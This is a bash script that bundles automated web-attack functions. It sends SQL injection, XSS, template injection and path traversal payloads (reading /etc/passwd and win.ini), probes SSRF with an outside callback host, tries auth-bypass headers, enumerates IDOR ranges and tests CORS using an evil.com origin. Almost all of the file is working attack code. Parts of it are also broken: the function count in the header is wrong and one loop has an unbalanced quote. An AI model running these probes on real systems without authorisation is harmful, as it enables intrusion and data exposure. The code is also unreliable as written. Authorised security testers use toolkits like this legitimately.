#!/usr/bin/env bash
# =====================================================================
# fuzzer-toolkit.sh — HTTP Fuzzing Toolkit for Linux/macOS
#
# 16 fuzzing functions mirroring fuzzer-toolkit.ps1. Source this file.
#
# Requires: curl, jq
# =====================================================================

[ -z "$BASH_VERSION" ] && [ -z "$ZSH_VERSION" ] && echo "fuzzer-toolkit.sh requires bash or zsh" && return 1

FUZZ_DIR="${FUZZ_DIR:-/tmp/fuzz-$(date +%Y%m%d)}"
mkdir -p "$FUZZ_DIR"

_fuzz_ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
_fuzz_log() { echo "[$(_fuzz_ts)] $*" >> "$FUZZ_DIR/session.log"; }
_fuzz_req() {
  curl -sk -o "$FUZZ_DIR/_resp.txt" -w "%{http_code}:%{size_download}" "$@"
}

# ─── 1. Get-Wordlist — wordlist loading ──────────────────────────
Get-Wordlist() {
  local name="${1:-common}"
  case "$name" in
    common)     echo -e "admin\ntest\ndebug\napi\nv1\nv2\ninternal\nprivate\nbackup\nconfig\ndev\nstaging\ndemo\ndocs\nstatic\nassets\nuploads\nimages\ndownloads\ntemplates\nincludes\nsrc\nlib\napp\ndata\nlog\nlogs\ntemp\ncache\n.git\n.env\n.svn\n.htaccess\nindex\nlogin\nsignup\nregister\nreset\nforgot\nlogout\nprofile\naccount\nsettings\nadmin\nmanage\ndashboard\npanel\nconsole\nstatus\nhealth\nmetrics\nmonitor\napi\nv1\nv2\nv3\nrest\ngraphql\nsoap\nxml\njson\nrpc\nws\nwebsocket\nswagger\nopenapi\napi-docs\ndocs\nredoc\nterms\nprivacy\nlegal\nsitemap\nrobots\nfavicon\nmanifest\nservice-worker\nstatic\nassets\ncss\njs\nimg\nimages\nfonts\nmedia\nvideo\nuploads\ndownloads";;
    *)          echo "Wordlist not found: $name";;
  esac
}

# ─── 2. Invoke-ParameterFuzz — parameter fuzzing ─────────────────
Invoke-ParameterFuzz() {
  local url="$1" param="${2:-id}" values="$3"
  local baseline
  baseline=$(curl -sk -o /dev/null -w "%{size_download}" "$url" 2>/dev/null)
  echo "=== Parameter Fuzz: ?$param ===" >> "$FUZZ_DIR/fuzz.log"
  for val in ${values:-admin 0 1 true false null "{}" "../etc/passwd" "' OR '1'='1" "<script>"}; do
    local status size
    read -r status size <<< "$(_fuzz_req "${url}?${param}=${val}" 2>/dev/null)"
    local diff=$(( size - baseline ))
    [ "${diff#-}" -gt 50 ] && echo "  ?$param=$val → $status (${size}b, Δ${diff})" | tee -a "$FUZZ_DIR/fuzz.log"
  done
}

# ─── 3. Invoke-PathFuzz — path/directory fuzzing ─────────────────
Invoke-PathFuzz() {
  local base="$1" wordlist="$2"
  echo "=== Path Fuzz: $base ==="
  while IFS= read -r path; do
    [ -z "$path" ] && continue
    local status size
    read -r status size <<< "$(_fuzz_req "${base}/${path}" 2>/dev/null)
    [ "$status" != "404" ] && echo "  /$path → $status (${size}b)"
  done < <(Get-Wordlist "${wordlist:-common}")
}

# ─── 4. Invoke-HeaderFuzz — header fuzzing ───────────────────────
Invoke-HeaderFuzz() {
  local url="$1"
  echo "=== Header Fuzz: $url ==="
  for header in "X-Forwarded-For: 127.0.0.1" \
                "X-Forwarded-Host: localhost" \
                "X-Original-URL: /admin" \
                "X-Rewrite-URL: /admin" \
                "X-Real-IP: 127.0.0.1" \
                "X-Forwarded-Proto: https" \
                "X-Forwarded-Port: 443" \
                "CF-Connecting-IP: 127.0.0.1" \
                "True-Client-IP: 127.0.0.1" \
                "X-Request-ID: $(date +%s)"; do
    local status
    status=$(curl -sk -H "$header" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
    echo "  Header: $header → $status"
  done
}

# ─── 5. Invoke-MethodBrute — HTTP method brute-force ─────────────
Invoke-MethodBrute() {
  local url="$1"
  echo "=== Method Brute: $url ==="
  for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT; do
    local status
    status=$(curl -sk -X "$method" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
    echo "  $method → $status"
  done
}

# ─── 6. Invoke-ContentTypeFuzz — Content-Type fuzzing ────────────
Invoke-ContentTypeFuzz() {
  local url="$1" method="${2:-POST}" data="${3:-test}"
  echo "=== Content-Type Fuzz: $url ==="
  for ct in "application/x-www-form-urlencoded" "application/json" "text/plain" "text/xml" \
            "application/xml" "multipart/form-data" "application/graphql"; do
    local status
    status=$(curl -sk -X "$method" -H "Content-Type: $ct" -d "$data" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
    echo "  $ct → $status"
  done
}

# ─── 7. Invoke-JsonFieldFuzz — JSON field fuzzing ────────────────
Invoke-JsonFieldFuzz() {
  local url="$1" method="${2:-POST}"
  echo "=== JSON Field Fuzz: $url ==="
  local fields=('{"admin":true}' '{"role":"admin"}' '{"is_admin":1}' '{"verified":true}' '{"email":"admin@test.com"}')
  for field in "${fields[@]}"; do
    local status
    status=$(curl -sk -X "$method" -H "Content-Type: application/json" -d "$field" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
    echo "  $field → $status"
  done
}

# ─── 8. Invoke-IdorRange — IDOR range enumeration ────────────────
Invoke-IdorRange() {
  local base_url="$1" start="${2:-1}" end="${3:-20}"
  echo "=== IDOR Range: $base_url [$start-$end] ==="
  for i in $(seq "$start" "$end"); do
    local url="${base_url/\{id\}/$i}"
    [ "$url" = "$base_url" ] && url="$base_url$i"
    local status size body
    body=$(curl -sk -w "%{http_code}:%{size_download}" -o /tmp/_idor_$$.txt "$url" 2>/dev/null)
    status=$(echo "$body" | cut -d: -f1)
    size=$(echo "$body" | cut -d: -f2)
    local unique_keys
    unique_keys=$(grep -oP '"(id|name|email|uuid|role|admin)"' /tmp/_idor_$$.txt 2>/dev/null | sort -u | wc -l)
    echo "  ID $i → $status (${size}b, ${unique_keys} fields)"
  done
  rm -f /tmp/_idor_$$.txt
}

# ─── 9. Invoke-SsrfProbe — SSRF probing ──────────────────────────
Invoke-SsrfProbe() {
  local url="$1" callback="${2:-http://oastify.com/probe}"
  echo "=== SSRF Probe: $url ==="
  for param in url uri file redirect next path dest return page load src target; do
    local status
    status=$(curl -sk -o /dev/null -w "%{http_code}" "${url}?${param}=${callback}" 2>/dev/null)
    echo "  ?$param=$callback → $status"
  done
  for header in "Referer: $callback" "X-Forwarded-For: $callback"; do
    local status
    status=$(curl -sk -H "$header" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
    echo "  Header: $header → $status"
  done
}

# ─── 10. Invoke-SqliProbe — SQLi probing ─────────────────────────
Invoke-SqliProbe() {
  local url="$1" param="${2:-id}"
  echo "=== SQLi Probe: $url ==="
  for payload in "'" "''" "1" "1'" "' OR '1'='1" "' OR '1'='1' --" \
                  "\" OR \"1\"=\"1" "' UNION SELECT 1--" "' UNION SELECT 1,2,3--" \
                  "1 AND 1=1" "1 AND 1=2"; do
    local body1 body2
    body1=$(curl -sk "${url}?${param}=1" -o /dev/null -w "%{size_download}" 2>/dev/null)
    body2=$(curl -sk "${url}?${param}=${payload}" -o /dev/null -w "%{size_download}" 2>/dev/null)
    local error
    error=$(curl -sk "${url}?${param}=${payload}" 2>/dev/null | grep -oiP "(sql|syntax|mysql|postgresql|oracle|odbc|driver)" | head -1)
    [ -n "$error" ] && echo "  ?$param=$payload → SQL error: $error"
    [ $(( body2 - body1 )) -gt 100 ] && echo "  ?$param=$payload → size anomaly: ${body1}b vs ${body2}b"
  done
}

# ─── 11. Invoke-XssProbe — XSS probing ────────────────────────────
Invoke-XssProbe() {
  local url="$1" param="${2:-q}"
  echo "=== XSS Probe: $url ==="
  for payload in "<script>alert(1)</script>" "<img src=x onerror=alert(1)>" \
                  "javascript:alert(1)" "\"><script>alert(1)</script>" \
                  "'-alert(1)-'" "<svg onload=alert(1)>"; do
    local reflected
    reflected=$(curl -sk "${url}?${param}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")" 2>/dev/null)
    if echo "$reflected" | grep -qF "$payload"; then
      echo "  $payload → REFLECTED!"
    fi
  done
}

# ─── 12. Invoke-SstiProbe — SSTI probing ────────────────────────
Invoke-SstiProbe() {
  local url="$1" param="${2:-name}"
  echo "=== SSTI Probe: $url ==="
  for payload in "{{7*7}}" '${7*7}' '<%= 7*7 %>' '{{7*7}}' '#{7*7}' '*{7*7}'; do
    local body
    body=$(curl -sk "${url}?${param}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")" 2>/dev/null)
    if echo "$body" | grep -q "49"; then
      echo "  $payload → 49 detected (SSTI likely)"
    fi
  done
}

# ─── 13. Invoke-LfiProbe — LFI probing ──────────────────────────
Invoke-LfiProbe() {
  local url="$1" param="${2:-file}"
  echo "=== LFI Probe: $url ==="
  for payload in "/etc/passwd" "../../../etc/passwd" "../../../../etc/passwd" \
                  "....//....//....//etc/passwd" "/etc/passwd%00" \
                  "../../../windows/win.ini" "php://filter/convert.base64-encode/resource=index"; do
    local body
    body=$(curl -sk "${url}?${param}=${payload}" 2>/dev/null)
    if echo "$body" | grep -qP "(root:|bin:|sbin:|\[fonts\]|PGh0bWw)"; then
      echo "  ?$param=$payload → LFI detected!"
    fi
  done
}

# ─── 14. Invoke-RateLimitTest — rate-limit testing ───────────────
Invoke-RateLimitTest() {
  local url="$1" requests="${2:-30}"
  echo "=== Rate Limit Test: $url x $requests ==="
  local results=()
  for i in $(seq 1 "$requests"); do
    results+=("$(curl -sk -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)")
  done
  echo "${results[@]}" | tr ' ' '\n' | sort | uniq -c | sort -rn | while read -r count code; do
    echo "  HTTP $code: $count times"
  done
}

# ─── 15. Invoke-NoAuthProbe — no-auth / broken access control ───
Invoke-NoAuthProbe() {
  local url="$1"
  echo "=== No-Auth Probe: $url ==="
  local authed_body unauth_body
  authed_body=$(curl -sk -H "Authorization: Bearer TEST" "$url" 2>/dev/null | wc -c)
  unauth_body=$(curl -sk "$url" 2>/dev/null | wc -c)
  [ "$unauth_body" -gt 0 ] && [ "$authed_body" -eq "$unauth_body" ] && \
    echo "  No auth required! (response size match)"
  echo "  Auth response: ${authed_body}b, No-auth response: ${unauth_body}b"
}

# ─── 16. Invoke-CorsProbe — CORS misconfiguration probe ──────────
Invoke-CorsProbe() {
  local url="$1"
  echo "=== CORS Probe: $url ==="
  for origin in "https://evil.com" "null" "https://$url" "http://$url"; do
    local acao
    acao=$(curl -sk -H "Origin: $origin" -D /tmp/_cors_headers_$$.txt -o /dev/null "$url" 2>/dev/null)
    local cors
    cors=$(grep -i "access-control-allow-origin" /tmp/_cors_headers_$$.txt 2>/dev/null)
    [ -n "$cors" ] && echo "  Origin: $origin → $cors"
  done
  rm -f /tmp/_cors_headers_$$.txt
}

# ─── 17. Invoke-FullFuzzPipeline — orchestrating pipeline ────────
Invoke-FullFuzzPipeline() {
  local url="$1"
  mkdir -p "$FUZZ_DIR"
  echo "=== Full Fuzz Pipeline: $url ===" | tee -a "$FUZZ_DIR/pipeline.log"
  Invoke-MethodBrute "$url" | tee -a "$FUZZ_DIR/pipeline.log"
  Invoke-ParameterFuzz "$url" | tee -a "$FUZZ_DIR/pipeline.log"
  Invoke-HeaderFuzz "$url" | tee -a "$FUZZ_DIR/pipeline.log"
  Invoke-CorsProbe "$url" | tee -a "$FUZZ_DIR/pipeline.log"
  Invoke-RateLimitTest "$url" 20 | tee -a "$FUZZ_DIR/pipeline.log"
  echo "Done. Log: $FUZZ_DIR/pipeline.log"
}

# ─── 18. Out-FuzzReport — fuzz report output ─────────────────────
Out-FuzzReport() {
  local url="$1"
  local report="$FUZZ_DIR/report-$(echo "$url" | md5sum 2>/dev/null | cut -c1-8 || echo "report").md"
  cat > "$report" <<REPORT
# Fuzz Report

**Target:** $url
**Date:** $(date -u)
**Tool:** fuzzer-toolkit.sh

## Results
\`\`\`
$(cat "$FUZZ_DIR/pipeline.log" 2>/dev/null || echo "No pipeline run")
\`\`\`
REPORT
  echo "Report: $report"
}

echo "fuzzer-toolkit.sh loaded — 18 functions available"
